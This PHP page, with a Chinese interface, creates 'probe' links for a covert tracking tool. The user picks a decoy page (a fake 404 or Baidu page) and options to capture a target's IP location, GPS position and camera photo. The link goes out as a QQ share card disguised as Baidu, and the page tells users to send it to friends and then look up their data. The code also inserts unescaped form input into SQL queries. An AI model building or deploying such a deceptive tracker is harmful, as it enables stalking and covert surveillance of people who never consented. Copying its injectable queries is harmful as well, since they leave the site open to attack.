<?php include_once("./include/reception/header.php"); ?>
<?php include_once("./include/auxiliary/qqshare.php"); ?>
<!---表单探针添加--->
<fieldset class="layui-elem-field">
  <legend>探针添加</legend>
	<div class="layui-field-box">
	
        <form class="layui-form layui-form-pane" action="?action=probe_add" method="POST">
		
		<div class="layui-form-item">
			<label class="layui-form-label">探针密钥</label>
			<div class="layui-input-block">
				<input name="add_key" class="layui-input" type="text" placeholder="请输入探针密钥" autocomplete="off" lay-verify="required">
			</div>
		</div>
  
	  <label class="layui-form-label">探针页面</label>
      <div class="layui-input-block">
      <select name="add_probe_page" lay-verify="required">
        <option value="">请选择页面</option>
        <option value="404">404</option>
        <option value="503">503</option>
        <option value="新建网站">新建网站</option>
		<option value="停止网站">停止网站</option>
		<option value="你好世界">你好世界</option>
		<option value="百度一下">百度一下</option>
      </select>
			<br>
    </div>
	
	  <div class="layui-form-item">
    <label class="layui-form-label">探针功能</label>
    <div class="layui-input-block">
      <input name="add_ip_location_function" title="IP定位" type="checkbox" checked="">
      <input name="add_gps_location_function" title="GPS定位" type="checkbox">
      <input name="add_camera_img_function" title="摄像头图片" type="checkbox">
	  <input name="add_email_notification_function" title="电子邮件通知" type="checkbox">
    </div>
  </div>
	
	<div class="layui-form-item">
		<label class="layui-form-label">电子邮箱</label>
		<div class="layui-input-block">
			<input name="add_email" class="layui-input" type="text" placeholder="请输入电子邮箱" autocomplete="off" lay-verify="required">
		</div>
	</div>
	
	<div class="layui-form-item">
		<label class="layui-form-label">QQ分享标题</label>
		<div class="layui-input-block">
			<input name="add_qqshare_title" class="layui-input" type="text" placeholder="请输入QQ分享标题" value="百度一下,你就知道" autocomplete="off" lay-verify="required">
		</div>
	</div>
	
	<div class="layui-form-item">
		<label class="layui-form-label">QQ分享图片</label>
		<div class="layui-input-block">
			<input name="add_qqshare_pics" class="layui-input" type="text" placeholder="请输入QQ分享图片" value="https://www.baidu.com/img/baidu.gif" autocomplete="off" lay-verify="required">
		</div>
	</div>
	
	<div class="layui-form-item">
		<label class="layui-form-label">QQ分享描述</label>
		<div class="layui-input-block">
			<input name="add_qqshare_summary" class="layui-input" type="text" placeholder="请输入QQ分享描述" value="百度一下,你就知道" autocomplete="off" lay-verify="required">
		</div>
	</div>
	
	<div class="layui-form-item">
		<label class="layui-form-label">QQ分享描述</label>
		<div class="layui-input-block">
			<input name="add_qqshare_desc" class="layui-input" type="text" placeholder="请输入QQ分享描述" value="百度一下,你就知道" autocomplete="off" lay-verify="required">
		</div>
	</div>
	
    <div class="layui-form-item">
    <div class="layui-input-block">
      <button class="layui-btn" lay-filter="probe_add" lay-submit="">添加</button>
      <button class="layui-btn layui-btn-primary" type="reset">重置</button>
    </div>
  </div>
	
</from>

  </div>
</fieldset>
<?php
$action=$_GET['action'];
if($action=="probe_add"){
	
	$add_key=$_POST['add_key'];
	$add_probe_page=$_POST['add_probe_page'];
	$add_ip_location_function=$_POST['add_ip_location_function'];
	$add_gps_location_function=$_POST['add_gps_location_function'];
	$add_camera_img_function=$_POST['add_camera_img_function'];
	$add_email_notification_function=$_POST['add_email_notification_function'];
	$add_email=$_POST['add_email'];
	$add_qqshare_title=$_POST['add_qqshare_title'];
	$add_qqshare_pics=$_POST['add_qqshare_pics'];
	$add_qqshare_summary=$_POST['add_qqshare_summary'];
	$add_qqshare_desc=$_POST['add_qqshare_desc'];
	if ($add_key=="" or $add_probe_page=="" or $add_email=="" or $add_qqshare_title=="" or $add_qqshare_pics=="" or $add_qqshare_summary=="" or $add_qqshare_desc==""){
	}
	else{
		
		$row=$DB->get_row("SELECT * FROM list_probe WHERE key_probe='{$add_key}' limit 1");
		if($row!=''){
			echo('<script>
	layui.use("layer", function(){
	  var layer = layui.layer;
	  
	 layer.open({
	  title: "提示"
	  ,content:"密钥已经存在"
	});     
	  
	}); 						
	</script>');
			
			}
		else{
			if($add_ip_location_function=="on"){
				$add_ip_location_function="1";
			}//是否启用IP定位
			else{
				$add_ip_location_function="0";
			}//是否启用IP定位
			if($add_gps_location_function=="on"){
				$add_gps_location_function="1";
			}//是否启用GPS定位
			else{
				$add_gps_location_function="0";
			}//是否启用GPS定位
			if($add_camera_img_function=="on"){
				$add_camera_img_function="1";
			}//是否启用摄像头图片
			else{
				$add_camera_img_function="0";
			}//是否启用摄像头图片
			if($add_email_notification_function=="on"){
				$add_email_notification_function="1";
			}//是否启用邮件通知
			else{
				$add_email_notification_function="0";
			}//是否启用邮件通知
			$DB->query("insert into `list_probe` (`key_probe`,`probe_page`,`ip_location_function`,`gps_location_function`,`camera_img_function`,`email_notification_function`,`email`,`qqshare_title`,`qqshare_pics`,`qqshare_summary`,`qqshare_desc`) values
			 ('$add_key','$add_probe_page','$add_ip_location_function','$add_gps_location_function','$add_camera_img_function','$add_email_notification_function','$add_email','$add_qqshare_title','$add_qqshare_pics','$add_qqshare_summary','$add_qqshare_desc')");
			
			echo '<script>
	layui.use("layer", function(){
	  var layer = layui.layer;
	  
	 layer.open({
	  title: "提示"
	  ,content:"生成成功"
	});     
	  
	}); 						
	</script>';
			
			echo('<p class="layui-elem-quote">生成成功，链接:'.
			'<a target="_blank" href="'.qqshare("http://".$_SERVER['HTTP_HOST']."/probe.php?key=".$add_key,$add_qqshare_title,$add_qqshare_pics,$add_qqshare_summary,$add_qqshare_desc).'">'."http://".$_SERVER['HTTP_HOST']."/probe.php?key=".$add_key.'</a></p>
			');
			
			statistics_probe_add_add();
		}
			
	}
	
}//判断类型
?>
<!---表单探针添加--->
<!---表单提示语--->
<p class="layui-elem-quote">1.输入密钥后添加探针，返回一个链接/卡片，发送给好友</p>
<p class="layui-elem-quote">2.好友点击链接/卡片后，点击网站上方的探针查询，即可查询IP及其他信息</p>
<p class="layui-elem-quote">3.禁止非法用途，如造成严重后果作者不负责</p>
<p class="layui-elem-quote">4.如该程序违法，请联系作者/站长</p>
<!---表单提示语--->
<?php include_once("./include/reception/footer.php"); ?>